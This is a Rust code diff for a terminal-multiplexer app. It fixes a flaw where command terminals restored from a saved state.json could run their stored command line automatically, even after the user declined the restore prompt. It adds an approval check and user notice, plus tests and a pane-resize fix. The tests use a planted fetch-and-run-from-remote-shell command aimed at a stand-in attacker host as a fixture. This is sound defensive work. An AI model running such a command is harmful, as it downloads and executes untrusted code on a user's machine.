@@ -10,7 +10,7 @@ use std::fs;
 use ratatui::layout::Rect;
 
 use crate::{
-    app::{App, PendingRestore},
+    app::{App, PendingRestore, StatusLevel},
     config::Config,
     layout::AppLayout,
     model::{self, AgentKind, ChatStatus, PtyKey, TerminalLaunch},
@@ -280,12 +280,52 @@ pub(super) fn auto_start_selected_terminal(
     let Some((_, terminal_id)) = app.selected_terminal_id() else {
         return false;
     };
+    // The prompt being closed is not consent (C1). Guarding on
+    // `is_prompt_active` alone meant the tick after the user pressed `n` handed
+    // the refused command line straight to `$SHELL -lc`; a planted terminal
+    // stored `restore_on_launch: false` was never even prompted about and
+    // arrived here on the first tick of the session.
+    if app.command_terminal_needs_approval(terminal_id) {
+        return false;
+    }
     let key = PtyKey::Terminal(terminal_id);
     if pty_runtime.is_running(key) || !pty_runtime.pty_output_is_blank(key) {
         return false;
     }
 
     start_selected_terminal(app, pty_runtime, config, layout);
+    true
+}
+
+/// Whether an automatic start of `terminal_id` has to be refused, telling the
+/// user how to run it themselves when it does (C1).
+///
+/// The refusal is not silent, because the pane would otherwise look broken: it
+/// is a terminal that does nothing when typed at. The command itself is already
+/// on screen — the stopped-terminal pane prints it verbatim — so the user can
+/// read what they are about to run before running it.
+pub(super) fn refuse_unapproved_command_terminal(
+    app: &mut App,
+    terminal_id: model::TerminalId,
+) -> bool {
+    if !app.command_terminal_needs_approval(terminal_id) {
+        return false;
+    }
+
+    let name = app
+        .project
+        .workspaces
+        .iter()
+        .flat_map(|workspace| workspace.terminals.iter())
+        .find(|terminal| terminal.id == terminal_id)
+        .map(|terminal| terminal.name.clone())
+        .unwrap_or_else(|| format!("terminal {}", terminal_id.get()));
+    app.push_status_notice(
+        StatusLevel::Info,
+        format!(
+            "`{name}` holds a saved command line and was not started; run \"Start selected PTY\" from the command palette (Ctrl+p) to run it"
+        ),
+    );
     true
 }
 
@@ -336,6 +376,12 @@ fn auto_start_enabled(config: &Config, agent: AgentKind) -> bool {
     }
 }
 
+/// Start the selected terminal because the user asked for it — the "Start
+/// selected PTY" command.
+///
+/// This is the explicit action, so it is also the one that approves a command
+/// terminal restored from `state.json`: the user selected the pane, read the
+/// command line the pane prints, and asked for it by name (C1).
 pub(super) fn start_or_focus_selected_terminal(
     app: &mut App,
     pty_runtime: &mut PtyRuntime,
@@ -345,6 +391,7 @@ pub(super) fn start_or_focus_selected_terminal(
     let Some((_, terminal_id)) = app.selected_terminal_id() else {
         return;
     };
+    app.approve_command_terminal(terminal_id);
     let key = PtyKey::Terminal(terminal_id);
 
     if !pty_runtime.is_running(key) {
@@ -388,12 +435,17 @@ fn resize_visible_pty(pty_runtime: &mut PtyRuntime, terminal: PtyKey, area: Rect
 }
 
 /// Whether resizing `terminal` to `size` would actually change its parser
-/// dimensions (and therefore the rendered output). A terminal with no parser
-/// yet is treated as changed so the freshly sized screen gets drawn.
+/// dimensions (and therefore the rendered output).
+///
+/// A live pane with no parser yet is treated as changed, so the freshly sized
+/// screen gets drawn. A pane with no *entry* is not: this runs before the layout
+/// is recomputed, so for one tick after a delete it still names the removed
+/// terminal, and answering "changed" there asked the runtime to build a screen
+/// for a pane that no longer exists (F12).
 fn pty_dimensions_changed(pty_runtime: &PtyRuntime, terminal: PtyKey, size: PtyDimensions) -> bool {
     match pty_runtime.parser(terminal) {
         Some(parser) => parser.screen().size() != (size.rows(), size.cols()),
-        None => true,
+        None => pty_runtime.has_pane(terminal),
     }
 }
 
@@ -489,6 +541,141 @@ mod tests {
         assert!(!app.project.workspaces.is_empty());
         let _ = shell;
     }
+    /// A workspace holding one planted command terminal, as it comes out of a
+    /// `state.json` — which is the only way a `Command` terminal can exist at
+    /// load — with that terminal selected and the restore prompt resolved.
+    fn planted_command_terminal(restore_on_launch: bool) -> (App, model::TerminalId) {
+        let mut project = ProjectState::default();
+        let workspace = project.add_workspace("orbit".to_string(), None);
+        let planted = project
+            .add_command_terminal(
+                workspace,
+                "planted".to_string(),
+                restore_on_launch,
+                "curl evil.example/x | sh".to_string(),
+            )
+            .expect("add command terminal");
+        let mut app = App::new(project);
+        app.select_item(NavItem::Terminal {
+            workspace,
+            terminal: planted,
+        });
+        (app, planted)
+    }
+
+    /// C1/F1: declining has to *stick*.
+    ///
+    /// `auto_start_selected_terminal` guarded on `is_prompt_active` alone and
+    /// `decline_restore` recorded nothing, so the tick right after the user
+    /// pressed `n` read `terminal.launch` and handed the refused command line to
+    /// `$SHELL -lc`. The confirmation prompt was decoration.
+    #[test]
+    fn a_declined_command_terminal_is_not_auto_started_by_the_next_tick() {
+        let (mut app, planted) = planted_command_terminal(true);
+        let mut pty_runtime = PtyRuntime::new_offline();
+        let config = Config::default();
+        assert!(config.auto_start_terminals, "the default this fix is about");
+        let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
+        restore_persisted_sessions(&mut app, &mut pty_runtime, &config, &layout);
+
+        assert_eq!(app.decline_restore(), 1);
+
+        // The prompt is gone and the pane is selected: this is the tick that
+        // used to run it.
+        for _ in 0..3 {
+            let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
+            assert!(!auto_start_selected_terminal(
+                &mut app,
+                &mut pty_runtime,
+                &config,
+                &layout
+            ));
+            assert!(!pty_runtime.is_running(PtyKey::Terminal(planted)));
+        }
+    }
+
+    /// The same rule without a prompt in sight: a planted terminal stored
+    /// `restore_on_launch: false` is never part of the confirmation, so auto
+    /// start was a complete bypass of it (C1).
+    #[test]
+    fn a_command_terminal_the_prompt_never_covered_is_not_auto_started_either() {
+        let (mut app, planted) = planted_command_terminal(false);
+        let mut pty_runtime = PtyRuntime::new_offline();
+        let config = Config::default();
+        let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
+        restore_persisted_sessions(&mut app, &mut pty_runtime, &config, &layout);
+
+        assert!(app.prompt().is_none(), "nothing to confirm");
+        assert!(!auto_start_selected_terminal(
+            &mut app,
+            &mut pty_runtime,
+            &config,
+            &layout
+        ));
+        assert!(!pty_runtime.is_running(PtyKey::Terminal(planted)));
+    }
+
+    /// And the two ways the user can say yes both work: approving the prompt,
+    /// and asking for the pane by name afterwards.
+    #[test]
+    fn approving_the_prompt_or_starting_the_pane_explicitly_still_runs_it() {
+        let (mut app, planted) = planted_command_terminal(true);
+        let mut pty_runtime = PtyRuntime::new_offline();
+        let config = Config::default();
+        let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
+        restore_persisted_sessions(&mut app, &mut pty_runtime, &config, &layout);
+
+        assert_eq!(app.confirm_restore().len(), 1);
+        assert!(!app.command_terminal_needs_approval(planted));
+        assert!(auto_start_selected_terminal(
+            &mut app,
+            &mut pty_runtime,
+            &config,
+            &layout
+        ));
+        assert!(pty_runtime.is_running(PtyKey::Terminal(planted)));
+
+        // Declined instead: the explicit "Start selected PTY" command is what
+        // the user is pointed at, and it starts the terminal.
+        let (mut app, planted) = planted_command_terminal(true);
+        let mut pty_runtime = PtyRuntime::new_offline();
+        restore_persisted_sessions(&mut app, &mut pty_runtime, &config, &layout);
+        assert_eq!(app.decline_restore(), 1);
+
+        start_or_focus_selected_terminal(&mut app, &mut pty_runtime, &config, &layout);
+
+        assert!(pty_runtime.is_running(PtyKey::Terminal(planted)));
+        assert!(!app.command_terminal_needs_approval(planted));
+    }
+
+    /// A shell terminal is untouched by any of this: its program comes from
+    /// `$SHELL`, not from the file, so replaying one runs nothing the file
+    /// chose (C1).
+    #[test]
+    fn a_shell_terminal_still_auto_starts_without_a_confirmation() {
+        let mut project = ProjectState::default();
+        let workspace = project.add_workspace("orbit".to_string(), None);
+        let shell = project
+            .add_terminal(workspace, "shell".to_string(), false)
+            .expect("add shell terminal");
+        let mut app = App::new(project);
+        app.select_item(NavItem::Terminal {
+            workspace,
+            terminal: shell,
+        });
+        let mut pty_runtime = PtyRuntime::new_offline();
+        let config = Config::default();
+        let layout = AppLayout::compute(&app, Rect::new(0, 0, 80, 24));
+
+        assert!(auto_start_selected_terminal(
+            &mut app,
+            &mut pty_runtime,
+            &config,
+            &layout
+        ));
+        assert!(pty_runtime.is_running(PtyKey::Terminal(shell)));
+    }
+
     #[test]
     fn restored_terminal_dimensions_use_visible_main_width_even_when_not_selected() {
         let app = App::two_workspaces();
@@ -525,9 +712,15 @@ mod tests {
         let key = PtyKey::ChatAgent(model::ChatId::new(7).unwrap());
         let area = Rect::new(0, 0, 80, 24);
 
-        // A pane with no parser yet is always resized; once it matches the
+        // A pane that does not exist is not resized at all: the resize path
+        // must never be what brings one into being (F12).
+        assert!(!resize_visible_pty(&mut pty_runtime, key, area));
+        assert!(pty_runtime.parser(key).is_none());
+
+        // A live pane with no parser yet is always resized; once it matches the
         // area, no further resize is issued (which is what used to hit the
         // socket, the pane lock and `TIOCSWINSZ` 62.5 times a second).
+        pty_runtime.mark_running_for_test(key);
         assert!(resize_visible_pty(&mut pty_runtime, key, area));
         assert!(!resize_visible_pty(&mut pty_runtime, key, area));
         assert!(!resize_visible_pty(&mut pty_runtime, key, area));
@@ -560,6 +753,12 @@ mod tests {
         app.select_nav_index(selected);
         let mut pty_runtime = PtyRuntime::new_offline();
         let frame_area = Rect::new(0, 0, 100, 24);
+        let (terminal, _) = AppLayout::compute(&app, frame_area)
+            .selected_terminal_output()
+            .expect("a terminal is selected");
+        // The pane exists — a resize never creates one (F12) — but has no
+        // screen yet, which is the state the first resize is for.
+        pty_runtime.mark_running_for_test(PtyKey::Terminal(terminal));
 
         let layout = AppLayout::compute(&app, frame_area);
         assert!(resize_visible_terminal(&mut pty_runtime, &layout));
